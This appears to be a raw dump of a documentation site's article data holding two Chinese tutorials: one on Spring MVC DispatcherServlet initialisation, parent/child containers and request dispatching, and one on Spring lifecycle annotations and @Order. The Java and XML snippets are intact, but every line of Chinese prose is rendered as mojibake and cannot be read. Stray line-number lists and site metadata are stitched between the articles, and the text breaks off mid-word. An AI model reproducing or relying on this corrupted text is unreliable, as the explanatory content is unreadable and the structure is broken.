¶æç»ç¶ç±»è¿æ¯ servletï¼åªæ¯å®ç°äºè§èï¼éåäºä¸äºæ¹æ³ã æ¯å¦ httpservletbean è¯¥ç±»éåäº init () æ¹æ³ï¼å¨å¯å¨æå® dispatcherservlet çæ¶åï¼ä¼è°ç¨è¢«éåç init æ¹æ³ãæ´ä½ init æµç¨å¦ä¸ï¼\n\næ´ä¸ª dispatcherservlet å è½½æµç¨ï¼\n1. tomcatä¼è°ç¨servletçinit()æ¹æ³\n2. httpservletbeanéåäºinit()æ¹æ³\n    2.1 è¯»åweb.xmléé¢çåå®¹å¹¶å°è£\n    2.2 æ§è¡æ ¸å¿ initservletbean() æ¹æ³\n    2.3 initservletbean() æ¹æ³è°ç¨ initwebapplicationcontext()\n3. initwebapplicationcontext æ¹æ³ï¼ç¨äºåå»º context ä¸ä¸æ\n    3.1 è°ç¨findwebapplicationcontext()æ¥è¯¢ web.xml æ¯å¦èªå®ä¹äº contextattribute è¿ä¸ªå±æ§\n    3.2 æ²¡ç¨èªå®ä¹å createwebapplicationcontext(rootcontext) åå»º org.springframework.web.context.support.xmlwebapplicationcontext å®ä¾ï¼å¹¶è·ç¶å®¹å¨ç»å®ã\n    3.3 ç» context è®¾ç½®ç¯å¢ä¿¡æ¯ wac.setenvironment(getenvironment());\n    3.4 è®¾ç½®å®ä¹ contextconfiglocation(/web-inf/spring.xml) çè·¯å¾\n    3.5 è°ç¨ configureandrefreshwebapplicationcontext() æ¹æ³\n4. configureandrefreshwebapplicationcontext æ¹æ³ï¼éç½®contextä¸ä¸æï¼å¹¶åå§åbean\n    4.1 è®¾ç½®ä¸ä¸æ idï¼ä¸º`åºç¨åç§°`+`servlet-name`\n    4.2 æå·²æçä¸ä¸æ(cotent)ä»¥åéç½®(config)è®¾ç½®å°æ°çcontextä¸­\n    4.3 ç»æ°çcontextæ·»å ä¸ä¸ªapplicationlistenerï¼ä¸»è¦ä¸º contextrefreshlistenerï¼å½ä¸ä¸æå·æ°å®æ¯åéç¥ï¼è¯¥ç±»è¢«éç¥ä¼è°ç¨ **frameworkservlet.this.onapplicationevent(event);** æ¹æ³ï¼è¿ä¸ªæ¹æ³å¾éè¦\n    4.4 è°ç¨ refresh() æ¹æ³ï¼æ§è¡ bean çåå§åæä½ï¼springé£ä¸å¥ï¼ï¼æ§è¡å®è°ç¨ this.finishrefresh(); ä¹å°±éç¥å° 4.3 ä¸­ç contextrefreshlistenerå¯¹è±¡å¹¶è°ç¨ frameworkservlet.this.onapplicationevent(event);\n5. frameworkservlet.this.onapplicationevent(event);è°ç¨å°dispatcherservlet.initstrategies()æ¹æ³å¹¶ä¼æ§è¡ä»¥ä¸åç§æ¹æ³ï¼ \n    initmultipartresolver(context);\n    initlocaleresolver(context);\n    initthemeresolver(context);\n    inithandlermappings(context); \n    inithandleradapters(context);\n    inithandlerexceptionresolvers(context);\n    initrequesttoviewnametranslator(context);\n    initviewresolvers(context);\n    initflashmapmanager(context);\n6. inithandlermappingsï¼ç¨äºæå·²ç»å è½½å°springå®¹å¨çå¯¹è±¡è¿è¡ææ£ï¼æå®ç°äº @requestmapping | @controller çbeanæåºæ¥å¹¶å¾å°ææå®ç°äº@requestmappingæ³¨è§£çæ¹æ³ æ³¨åå° mappingregister å®¹å¨ä¸­\n    6.1 ä»å®¹å¨ä¸­è¯»åå°å®ç°äºhandlermapping.class çbeanï¼è¿éå°±æ¯æ¾æä»¬èªå®ä¹å®ç°äºhandlermapping.classçbean\n    6.2 å¦ææ²¡æèªå®ä¹ç handlermappingï¼ä¼å è½½é»è®¤ç handlermappingï¼é»è®¤æ beannameurlhandlermapping,requestmappinghandlermapping,routerfunctionmapping,ææ¾å°çæ³¨åå° beanå®¹å¨ä¸­\n        6.2.1 requestmappinghandlermapping å¨æ³¨åbeançæ¶åä¼æ§è¡ afterpropertiesset()æ¹æ³ï¼è¯¥æ¹æ³éé¢ä¼å¾å°ææbeanï¼å¹¶å¤æ­ç±»åæ¯å¦æ¯æ controller.class æ requestmapping.class æ³¨è§£ï¼å¦æç¬¦åæ¡ä»¶ä»£è¡¨ä½ æ¯ä¸ä¸ª controllerhandler\n        6.2.2 å¦ææ¯ä¸ä¸ª controllerhandlerï¼åè·åè¯¥ç±»ä¸­çæ¹æ³å¹¶å¾å°æåªå«ærequestmapping.classæ³¨è§£çæ¹æ³ï¼å¹¶ä¸è§£ææ³¨è§£ä¸çåæ°,ææ¹æ³æ³¨åå°ä¸ä¸ª mappingregistry é\n    6.3 beannameurlhandlermapping æ¯ç± applicationcontextaware æç¥è°ç¨åå§åæ¹æ³ç\n        6.3.1 beannameurlhandlermapping å requestmappinghandlermapping è§£æçæ¹å¼ä¸ä¸æ ·ï¼beannameurlhandlermappingå¾å°å®¹å¨ä¸­ææbeanï¼ä¼å¤æ­beannameçåç¼ä»¥ \'/\'å¼å¤´å¹¶æ¶éï¼å¹¶ä¸æ³¨åå° handlermapä¸­\n        6.3.2 beannameurlhandlermapping åå¶ä»controlleråæ³ä¸ä¸æ ·ï¼å·ä½è¦ç»ç±»å  @component("/test") å¹¶ä¸è¿æå®ç° implements controller\n        6.3.3 æ¾å°å¹éæ¡ä»¶çæ¹æ³æä»ç»´æ¤å°èªå·±ç handlermap ä¸­\n    6.4 æ³¨æ beannameurlhandlermapping å requestmappinghandlermappingç»´æ¤äºä¸åç handler å®¹å¨ï¼æä»¥ç¸åçè¯·æ±è·¯å¾ä¸ä¼æ¥éï¼å¦æç¸åï¼æ§è¡beannameurlhandlermappingçæ¹æ³ï¼å ä¸ºä¼åçº§æ¯requestmappinghandlermappingé å\n7. inithandleradaptersï¼åå§åæ¹æ³ä¼åææéè¦çåå¤å¥½å è½½è¿å»\n    7.1 inithandleradapters ä»springå®¹å¨ä¸­æ¾å äº @controlleradvice çbean\n    7.2 å¾å°beanåå¤æ­å äº @modelattribute çæ³¨è§£ä½ä¸åå«æ @requestmappingæ³¨è§£çæ¹æ³ å­å° modelattributeadvicecacheä¸­\n    7.3 å¾å°beanåå¤æ­å äº @initbinder çæ¹æ³ å­å° initbinderadvicecache ä¸­\n    7.4 ä»å®¹å¶ä¸­å¾å°ææå®ç° requestbodyadvice æ responsebodyadvice æ¥å£ï¼è®°å½ä¸æ¥\n    7.5 åå§å httprequesthandleradapterãsimplecontrollerhandleradapterãrequestmappinghandleradapterãhandlerfunctionadapter\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# ç¶å­å®¹å¨\n\nç¶å­å®¹å¨ï¼å°±æ¯å¨ä¸ä¸ª web.xml éé¢æå®ä¸¤ä¸ª servletï¼å è½½ä¸åç spring.xmlï¼å±äº«ä¸ä¸ª listener ç¶å®¹å¨çå¯¹è±¡ãæ³¨æï¼ç¶å®¹å¨æ¯ä¼å¨ servlet èç¹ä¹åè§£æçãç¶å­å®¹å¨å·ä½å®ç°å¦ä¸ï¼\n\n<?xml version="1.0" encoding="utf-8"?>\n\x3c!-- è¿ä¸ªæä»¶æ¯tomcatè¦å»è¯»åçæä»¶ï¼æä»¶è·¯å¾å¿é¡»å¨ webapp/web-inf ä¸ï¼webappå javaæ¯åçº§ç®å½ --\x3e\n<web-app>\n    \n    \x3c!-- ç¶å®¹å¨ --\x3e\n    <listener>\n        <listener-class>org.springframework.web.context.contextloaderlistener</listener-class>\n    </listener>\n\n    <context-param>\n        <param-name>contextconfiglocation</param-name>\n        \x3c!-- æè¿°beançæä»¶ --\x3e\n        <param-value>/web-inf/spring2.xml</param-value>\n    </context-param>\n\n    \x3c!-- å­1 --\x3e\n    <servlet>\n        <servlet-name>app</servlet-name>\n        <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n        <init-param>\n            <param-name>contextconfiglocation</param-name>\n            \x3c!-- æå®spring.xmlå°å --\x3e\n            <param-value>/web-inf/spring.xml</param-value>\n        </init-param>\n        \x3c!--æ°å­åªæ¯å³å®åå§åé¡ºåº\n            é»è®¤è´æ°ï¼å®¢æ·ç«¯ç¬¬ä¸æ¬¡è®¿é®æåå§å\n            å¤§äºé¶ï¼çæ°è¡¨ç¤ºæå¡å¨å¯å¨æ¶ï¼åå§å\n            æ°å­è¶å°è¶ååå§å\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app</servlet-name>\n        \x3c!-- è®¿é®è·¯å¾åç¼ --\x3e\n        <url-pattern>/app/*</url-pattern>\n    </servlet-mapping>\n\n    \x3c!-- å­2 --\x3e\n    <servlet>\n        <servlet-name>app1</servlet-name>\n        <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n        <init-param>\n            <param-name>contextconfiglocation</param-name>\n            \x3c!-- æå®spring.xmlå°å --\x3e\n            <param-value>/web-inf/spring1.xml</param-value>\n        </init-param>\n        \x3c!--æ°å­åªæ¯å³å®åå§åé¡ºåº\n            é»è®¤è´æ°ï¼å®¢æ·ç«¯ç¬¬ä¸æ¬¡è®¿é®æåå§å\n            å¤§äºé¶ï¼çæ°è¡¨ç¤ºæå¡å¨å¯å¨æ¶ï¼åå§å\n            æ°å­è¶å°è¶ååå§å\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app1</servlet-name>\n        \x3c!-- è®¿é®è·¯å¾åç¼ --\x3e\n        <url-pattern>/app1/*</url-pattern>\n    </servlet-mapping>\n\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\ncontextloaderlistener ä¼åå»ºä¸ä¸ªå®¹å¨ applicationcontextï¼è§£æéç½®ç xml æä»¶ï¼èµ° spring å¸¸è§ç bean å è½½æµç¨ã è¿ä¸ª applicationcontext ä¼è¢«åä¸º servlet çç¶å®¹å¨è¢«å è½½å° servletcontextï¼mapï¼ä¸­ï¼å½ servlet è¢«å è½½çæ¶åä¼åç¶å®¹å¨è¿è¡ç»å®ï¼è¯¦è§ dispatcherservlet åå§åè®²è§£ 3.2\n\n\n# ä»£ç åä»£ xml éç½®\n\næ´ä½å xml æ¯å·®ä¸å¤ç\n\npublic class mywebapplicationinitializer implements webapplicationinitializer {\n    \n    @override\n    public void onstartup(servletcontext servletcontext) throws servletexception {\n        // load spring web application configuration\n        annotationconfigwebapplicationcontext context = new annotationconfigwebapplicationcontext();\n        context.register(appconfig.class);\n\n        // create and register the dispatcherservlet\n        dispatcherservlet servlet = new dispatcherservlet(context);\n        servletregistration.dynamic registration = servletcontext.addservlet("app", servlet);\n        registration.setloadonstartup(1);\n        registration.addmapping("/app/*");\n    }\n\n    @componentscan("com.fengqianrun.mvc")\n    public class appconfig{\n\n    }\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nmywebapplicationinitializer è¢«å è½½æ¯éè¿ springservletcontainerinitializer å®ç°äº servletcontainerinitializer çè§èï¼å¨ springservletcontainerinitializer ä¸­æä¸ä¸ª @handlestypesï¼éé¢å°±å®ä¹äº webapplicationinitializerï¼ä¼æè¯¥ç±»å è½½ä¼ å¥ springservletcontainerinitializer ç onstartup æ¹æ³ï¼è¯¥æ¹æ³éé¢ç»§ç»­è°ç¨å®ç°äº webapplicationinitializer ç onstartup æ¹æ³\n\n\n# è¯·æ±å®ç°\n\næä»¬é½ç¥éæ©åºåä¸ä¸ª httpservlet å¹¶å®ç° service () è½¬åå·ä½ doget dopost å¹¶å®ç°ä¸å¡é»è¾ãdispatcherservlet ä¸æ ·å®ç°äº httpservlet å¹¶éåäº serviceãdogetãdopost ç­æ¹æ³ï¼å®ç°å·ä½æµç¨æ¯ï¼\n\n1. ç±dispatcherservletçç¶ç±»frameworkservletå·ä½å®ç°äºserviceãdogetãdopostæ¹æ³\n2. frameworkservletä¼åè¢«è°ç¨service()æ¹æ³ï¼è§£ææ¹æ³çè¯·æ±æ¹å¼æ¯ get è¿æ¯ postï¼åè°ç¨httpservletçservice()æ¹æ³è¿ä¸æ­¥å¤æ­æ¯è°ç¨ doget è¿æ¯ dopostæ¹æ³\n3. httpservletå¨è°ç¨frameworkservletå·ä½å®ç°äºdogetædopostæ¹æ³\n    3.1 \n4. dopostå®ç°ä¼è°ç¨frameworkservletçå­ç±»dispatcherservletçdoserviceæ¹æ³\n    4.1 doservice é¦åä¼æå°è¯·æ±çä¿¡æ¯\n    4.2 æcontextæ·»å å° request çè¯·æ±ä¸­\n    4.3 flashmapmanager\n    4.4 è°ç¨ dodispatch æ¹æ³\n5. dodispatch\n    5.1 å¾å°é»è®¤çä¸ä¸ª mappingï¼ beannameurlhandlermapping,requestmappinghandlermapping,routerfunctionmappingï¼è¯¦ç»å¨dispatcherservlet åå§åè®²è§£6.2ä¸­ï¼\n    5.2 ä¾¿å©æ¯ä¸ª mappingï¼å¹¶å¾å°è¯·æ±çè·¯å¾ï¼æ ¹æ®è·¯å¾å»æ¾ handlerï¼è¿ä¸ªhandlerå°±æ¯dispatcherservlet åå§åè®²è§£6.2.2çæ¹æ³ï¼ï¼å¦ææ¯beannameurlhandlermappingæ¾å°çæ¯beanï¼requestmappinghandlermappingæ¾å°çæ¯ hanlermethod ç»ä¸ä¸º handler\n    5.3 æ¾å°handleråä¼å°è£ä¸ºä¸ä¸ª handleræ§è¡é¾ï¼è¿ä¸ªæ§è¡é¾åå«äºæ¦æªå¨ï¼æä»¥ç§°ä¸ºé¾\n    5.4 ç±äºè·åç handler æ¯ä¸ä¸ªobjectï¼æ æ³ç¡®å®æ¯beannameurlhandlermappingçbeanè¿æ¯requestmappinghandlermappingçhandlermethodï¼æä»¥æ§è¡ gethandleradapter è¿è¡éé\n        5.4.1 æå·²ç»å è½½ç handleradapters è¿è¡ä¾¿å©ï¼dispatcherservlet åå§åè®²è§£ 7.5ï¼\n        5.4.2 æ¯ä¸ª handleradapter å®ç°æ¹å¼ä¸ä¸æ ·ï¼ä¼æä¸ªç»ä¸ç supports æ¹æ³æ¥å¤æ­æ¯å¦å®ç°äºä¸å mapping çè¦æ±ï¼å¹¶æ¾å°åéç adapter\n            5.4.2.1 å¦ requestmappinghandlermapping å¯¹åºçæ¯ requestmappinghandleradapterï¼adapter ç supportsä¼å¤æ­æ¯å¦æ¯ handlermethod çå®ä¾ï¼æ¯åå¾å°è¿ä¸ª adapter\n        5.4.3 handleræ§è¡é¾å¼å§æ§è¡æ¦æªå¨ï¼ä¼éåææçæ¦æªå¨æ§è¡æ§è¡åç½®æ¹æ³ï¼å¦ææ¦æªå¨åç½®æ¹æ³è¿åfalseååé¢ä¸å¨æ§è¡\n        5.4.4 æ¦æªå¨æ§è¡å®æ¯åå°±å¯ä»¥æ§è¡å¾å°ç handleradapter ç handler æ¹æ³ï¼å»çæ­£æ§è¡ controller çæ¹æ³ï¼è¿åå¼ä¼å°è£æ modelandview\n            5.4.4.1 æ£æ¥æ¯å¦éå¶äºè¯·æ±æ¹å¼ï¼æ¯å¦åªæ¯æ post è¯·æ±\n            5.4.4.2 å¤æ­æ¯å¦å¼å¯sessionéï¼ç¨äºå¯¹ææç¸åsessionçè¯·æ±è¿è¡å¹¶åéå¶\n            5.4.4.3 æ§è¡invokehandlermethodæ¹æ³\n                5.4.4.3.1 æ¾åº@initbinderåå»ºä¸ä¸ª binderfactory å·¥åï¼è¯¥å·¥åæ¯å¯¹methodè¯·æ±åæ°åç±»åè½¬æ¢ï¼æ¾çæ¯å½åmethodæå¨å±ç@initbinderçè½¬æ¢å¨\n                5.4.4.3.2 çæmodelfactoryï¼æ@modelattributeçkeyåvalueï¼ä»¥å@sessionattributesçkeyåvalueæ·»å å° modelä¸­ï¼å¯ä»¥ä¿éå¨controllerçmodelä¸­å¾å°æ°æ®\n                5.4.4.3.3 åå»ºä¸ä¸ªå¤çæ¹æ³çå¯¹è±¡ï¼è®¾ç½®æ¹æ³è§£æå¨ï¼è§£æ@requestparamç­æ³¨è§£æå¯¹è±¡ï¼ï¼è¿åå¼è§£æå¨ï¼æ¯å¦å äº@responsebodyè¦è§£ææjsonï¼ï¼è®¾ç½®binderfactory\n                5.4.4.3.4 åå»º modelandviewcontainerï¼ç»modelandviewcontainer æ·»å è§£æçåå®¹ï¼åå§åï¼ï¼ç¶åå·ä½å»æ§è¡ invokandhandler(req,modelandviewcontainer)ï¼å¾å°æ´å¤çä¿¡æ¯ç» modelandviewcontainerï¼æ¯å¦è¿åç»æ\n                5.4.4.3.5 æåå¯¹ modelandviewcontainer è¿è¡å¤çï¼å¤æ­å½åè¯·æ±æ¯å¦è¿è¡äºéå®å\n        5.4.5 éè¿è¿åç modelandview æ¥æ¾å¹¶è®¾ç½®è§å¾\n        5.4.6 æ§è¡æ¦æªå¨åç½®æ¹æ³\n        5.4.7 è§å¾æ¸²æ\n        5.4.8 åè°ç¨æ¦æªçæ§è¡å®ææ¹æ³\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n',charsets:{cjk:!0}},{title:"æ³¨è§£æ¿ä»£Springçå½å¨æå®ç°ç±»",frontmatter:{title:"æ³¨è§£æ¿ä»£Springçå½å¨æå®ç°ç±»",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/205/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/21.spring/205.%E6%B3%A8%E8%A7%A3%E6%9B%BF%E4%BB%A3Spring%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%AE%9E%E7%8E%B0%E7%B1%BB.html",relativePath:"00.java/20.Spring/21.spring/205.æ³¨è§£æ¿ä»£Springçå½å¨æå®ç°ç±».md",key:"v-7b24cf72",path:"/spring/spring/205/",headers:[{level:2,title:"Spring IOC",slug:"spring-ioc",normalizedTitle:"spring ioc",charIndex:151},{level:3,title:"@Bean",slug:"bean",normalizedTitle:"@bean",charIndex:166},{level:3,title:"@Scope",slug:"scope",normalizedTitle:"@scope",charIndex:307},{level:3,title:"@PostConstruct",slug:"postconstruct",normalizedTitle:"@postconstruct",charIndex:352},{level:3,title:"@PreDestroy",slug:"predestroy",normalizedTitle:"@predestroy",charIndex:389},{level:3,title:"Spring DI",slug:"spring-di",normalizedTitle:"spring di",charIndex:426},{level:3,title:"@Autowired",slug:"autowired",normalizedTitle:"@autowired",charIndex:644},{level:3,title:"@Qualifier",slug:"qualifier",normalizedTitle:"@qualifier",charIndex:759},{level:3,title:"@Resource",slug:"resource",normalizedTitle:"@resource",charIndex:936},{level:3,title:"@Value",slug:"value",normalizedTitle:"@value",charIndex:1155},{level:2,title:"Spring AOP",slug:"spring-aop",normalizedTitle:"spring aop",charIndex:1196},{level:3,title:"@Aspect",slug:"aspect",normalizedTitle:"@aspect",charIndex:1211},{level:3,title:"@Before",slug:"before",normalizedTitle:"@before",charIndex:1246},{level:3,title:"@AfterReturning",slug:"afterreturning",normalizedTitle:"@afterreturning",charIndex:1281},{level:3,title:"@AfterThrowing",slug:"afterthrowing",normalizedTitle:"@afterthrowing",charIndex:1335},{level:3,title:"@After",slug:"after",normalizedTitle:"@after",charIndex:1281},{level:3,title:"@Around",slug:"around",normalizedTitle:"@around",charIndex:1420},{level:2,title:"å¶ä»æ³¨è§£",slug:"å¶ä»æ³¨è§£",normalizedTitle:"å¶ä»æ³¨è§£",charIndex:1455},{level:3,title:"@Order",slug:"order",normalizedTitle:"@order",charIndex:1464},{level:4,title:"éè¯¯ä½¿ç¨",slug:"éè¯¯ä½¿ç¨",normalizedTitle:"éè¯¯ä½¿ç¨",charIndex:1765},{level:4,title:"æ­£ç¡®ä½¿ç¨",slug:"æ­£ç¡®ä½¿ç¨",normalizedTitle:"æ­£ç¡®ä½¿ç¨",charIndex:2381},{level:3,title:"@AutoConfigureOrder",slug:"autoconfigureorder",normalizedTitle:"@autoconfigureorder",charIndex:3008}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"Spring IOC @Bean @Scope @PostConstruct @PreDestroy Spring DI @Autowired @Qualifier @Resource @Value Spring AOP @Aspect @Before @AfterReturning @AfterThrowing @After @Around å¶ä»æ³¨è§£ @Order éè¯¯ä½¿ç¨ æ­£ç¡®ä½¿ç¨ @AutoConfigureOrder",content:'å¨æ©æç Spring ä¸­ï¼æä»¬é½æ¯ä½¿ç¨ XML æ¥è¿è¡ç¸åºç Bean ä¾èµæè¿°åå±æ§æè¿°ï¼ä½å¨ Spring Boot ä¸­å¤§å¤è¿æ¯ä¹ æ¯ä½¿ç¨æ³¨è§£çæ¹å¼æ¥å®ç°ï¼é£è¿éæå°±æ¥æ»ç»ä¸å¨ Spring çå½å¨æä¸­ï¼æåªäºç±»æä¾äºæ©å±å¯ä»¥ç»æä»¬å®ç°ï¼ä»¥ååå xml çæ¹å¼åæ³¨è§£æ¹å¼çä¸¤ç§å®ç°æ¹å¼ã\n\n\n# Spring IOC\n\n\n# @Bean\n\n<bean id="student" class="com.xinhua.study.bean.Student" scope="prototype" init-method="init()" destroy-method="destroy()"/>\n\n\n1\n\n\n\n# @Scope\n\nscope="singleton/prototype"\n\n\n1\n\n\n\n# @PostConstruct\n\ninit-method\n\n\n1\n\n\n\n# @PreDestroy\n\ndestroy-method\n\n\n1\n\n\n\n# Spring DI\n\nAutowired+Qualifier=Resource è¿å°±æ¯ä»ä»¬ä¸èçå³ç³»ï¼Autowired æ ¹æ®ç±»åæ¾å®ç°ç±»ï¼ä¸ä¸ªæ¥å£æå¤ä¸ªå®ç°ç±»æ¶éè¦éè¿ Qualifier æ¥ææéè¦åªä¸ªå®ç°ç±»ï¼è¿æ¯å°±éè¦ Autowired+Qualifier ä¸èµ·ä½¿ç¨æå¯ä»¥ãResource åæ¯ä¸å£°æåç§°æ¶æç§ç±»åæ¥æ¾ææä¸ Autowired ç¸åï¼å£°æåç§°æ¶å°±ç­äº Autowired+Qualifier çç»å\n\n\n# @Autowired\n\n@Autowired å¯ä»¥åç¬ä½¿ç¨ãå¦æåç¬ä½¿ç¨ï¼å®å°æç±»åè£éãå æ­¤ï¼å¦æå¨å®¹å¨ä¸­å£°æäºå¤ä¸ªç¸åç±»åç beanï¼åä¼åºç°é®é¢ï¼å ä¸º @Autowired ä¸ç¥éè¦ä½¿ç¨åªä¸ª bean æ¥æ³¨å¥ãå æ­¤ï¼ä½¿ç¨ @Qualifier ä¸ @Autowired ä¸èµ·ï¼éè¿æå® bean åç§°æ¥éæå®éè£éç bean\n\nref="ç±»å"\n\n\n1\n\n\n\n# @Qualifier\n\n@Qualifier é»è®¤æåç§°è£éï¼è¿ä¸ªæ³¨è§£æ¯å±äº spring çï¼ï¼value é»è®¤ @Qualifier (value = "") ç©ºå¼ã\n\nref="ç±»å"\n\n\n1\n\n\n\n# @Resource\n\n@Resourceï¼è¿ä¸ªæ³¨è§£å±äº J2EE çï¼ï¼é»è®¤æç§åç§°è¿è¡è£éï¼åç§°å¯ä»¥éè¿ name å±æ§è¿è¡æå®ï¼ å¦ææ²¡ææå® name å±æ§ï¼å½æ³¨è§£åå¨å­æ®µä¸æ¶ï¼é»è®¤åå­æ®µåè¿è¡æç§åç§°æ¥æ¾ï¼å¦ææ³¨è§£åå¨ setter æ¹æ³ä¸é»è®¤åå±æ§åè¿è¡è£éã å½æ¾ä¸å°ä¸åç§°å¹éç bean æ¶ææç§ç±»åè¿è¡è£éãä½æ¯éè¦æ³¨æçæ¯ï¼å¦æ name å±æ§ä¸æ¦æå®ï¼å°±åªä¼æç§åç§°è¿è¡è£éã\n\nref="ç±»å"\n\n\n1\n\n\n\n# @Value\n\nç»åºæ¬æ°æ®ç±»åèµå¼\n\nref="åºç¡æ°æ®ç±»å"\n\n\n1\n\n\n\n# Spring AOP\n\n\n# @Aspect\n\nå£°æçé¢\n\napo:aspect\n\n\n1\n\n\n\n# @Before\n\nåç½®éç¥\n\napo:before\n\n\n1\n\n\n\n# @AfterReturning\n\nåç½®æ­£å¸¸éç¥\n\naop:after-returning\n\n\n1\n\n\n\n# @AfterThrowing\n\nåç½®å¼å¸¸éç¥\n\naop:after-throwing\n\n\n1\n\n\n\n# @After\n\næç»éç¥\n\naop:after\n\n\n1\n\n\n\n# @Around\n\nç¯ç»éç¥\n\naop:around\n\n\n1\n\n\n\n# å¶ä»æ³¨è§£\n\n\n# @Order\n\næå¼å§ Order æ³¨è§£ç¨äºåé¢çä¼åçº§æå®ï¼å¨ 4.0 ä¹åå¯¹å®çåè½è¿è¡äºå¢å¼ºï¼æ¯æéåçæ³¨å¥æ¶ï¼æå®éåä¸­ bean çé¡ºåºï¼å¹¶ä¸ç¹å«æåºäºï¼å®å¯¹äºåå®ä¾ç bean ä¹é´çé¡ºåºï¼æ²¡æä»»ä½å½±åã\n\næ³¨è§£ @Order æèæ¥å£ Ordered çä½ç¨æ¯å®ä¹ Spring IOC å®¹å¨ä¸­ Bean çæ§è¡é¡ºåºçä¼åçº§ï¼èä¸æ¯å®ä¹ Bean çå è½½é¡ºåºï¼Bean çå è½½é¡ºåºä¸å @Order æ Ordered æ¥å£çå½±åï¼\n\n@Order æ³¨è§£ä¸è½æå® bean çå è½½é¡ºåºï¼å®éç¨äº AOP çä¼åçº§ï¼ä»¥åå°å¤ä¸ª Bean æ³¨å¥å°éåæ¶ï¼è¿äº bean å¨éåä¸­çé¡ºåº\n\n# éè¯¯ä½¿ç¨\n\n// éè¯¯ä½¿ç¨æ¹æ³ 1\n@Component\n@Order(2)\npublic class OrderA {\n    public OrderA() {\n        System.out.println("************ A ************");\n    }\n}\n\n@Component\n@Order(1)\npublic class OrderB {\n    public OrderB() {\n        System.out.println("************ B ************");\n    }\n}\n// éè¯¯ä½¿ç¨æ¹æ³ 2\n@Configuration\npublic class OrderBeanConfig {\n \n    @Order(2)\n    @Bean\n    public OrderC orderC() {\n        return new OrderC();\n    }\n \n    @Order(1)\n    @Bean\n    public OrderD orderD() {\n        return new OrderD();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n# æ­£ç¡®ä½¿ç¨\n\n@Component\n@Order(value = 3)\npublic class AnoBeanA implements IBean{\n    public AnoBeanA() {\n        System.out.println("************ AnoBean A ************");\n    }\n}\n\n@Component\n@Order(value = 2)\npublic class AnoBeanB implements IBean{\n \n    public AnoBeanB() {\n        System.out.println("************ AnoBean B ************");\n    }\n}\n\n@Component\npublic class AnoBean {\n    public AnoBean(List<IBean> anoBeanList) {\n        for (IBean bean : anoBeanList) {\n            System.out.println("in ano testBean: "+ bean.getClass())\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# @AutoConfigureOrder\n\n@AutoConfigureOrder æå®å¤é¨ä¾èµç AutoConfig çå è½½é¡ºåºï¼å³å®ä¹å¨ / META-INF/spring.factories æä»¶ä¸­çéç½® bean ä¼åçº§)ï¼å¨å½åå·¥ç¨ä¸­ä½¿ç¨è¿ä¸ªæ³¨è§£å¹¶æ²¡æä»ä¹ç¨ï¼åæ ·ç @AutoConfigureBefore å @AutoConfigureAfter è¿ä¸¤ä¸ªæ³¨è§£çéç¨èå´å @AutoConfigureOrder ä¸æ ·',normalizedContent:'å¨æ©æç spring ä¸­ï¼æä»¬é½æ¯ä½¿ç¨ xml æ¥è¿è¡ç¸åºç bean ä¾èµæè¿°åå±æ§æè¿°ï¼ä½å¨ spring boot ä¸­å¤§å¤è¿æ¯ä¹ æ¯ä½¿ç¨æ³¨è§£çæ¹å¼æ¥å®ç°ï¼é£è¿éæå°±æ¥æ»ç»ä¸å¨ spring çå½å¨æä¸­ï¼æåªäºç±»æä¾äºæ©å±å¯ä»¥ç»æä»¬å®ç°ï¼ä»¥ååå xml çæ¹å¼åæ³¨è§£æ¹å¼çä¸¤ç§å®ç°æ¹å¼ã\n\n\n# spring ioc\n\n\n# @bean\n\n<bean id="student" class="com.xinhua.study.bean.student" scope="prototype" init-method="init()" destroy-method="destroy()"/>\n\n\n1\n\n\n\n# @scope\n\nscope="singleton/prototype"\n\n\n1\n\n\n\n# @postconstruct\n\ninit-method\n\n\n1\n\n\n\n# @predestroy\n\ndestroy-method\n\n\n1\n\n\n\n# spring di\n\nautowired+qualifier=resource è¿å°±æ¯ä»ä»¬ä¸èçå³ç³»ï¼autowired æ ¹æ®ç±»åæ¾å®ç°ç±»ï¼ä¸ä¸ªæ¥å£æå¤ä¸ªå®ç°ç±»æ¶éè¦éè¿ qualifier æ¥ææéè¦åªä¸ªå®ç°ç±»ï¼è¿æ¯å°±éè¦ autowired+qualifier ä¸èµ·ä½¿ç¨æå¯ä»¥ãresource åæ¯ä¸å£°æåç§°æ¶æç§ç±»åæ¥æ¾ææä¸ autowired ç¸åï¼å£°æåç§°æ¶å°±ç­äº autowired+qualifier çç»å\n\n\n# @autowired\n\n@autowired å¯ä»¥åç¬ä½¿ç¨ãå¦æåç¬ä½¿ç¨ï¼å®å°æç±»åè£éãå 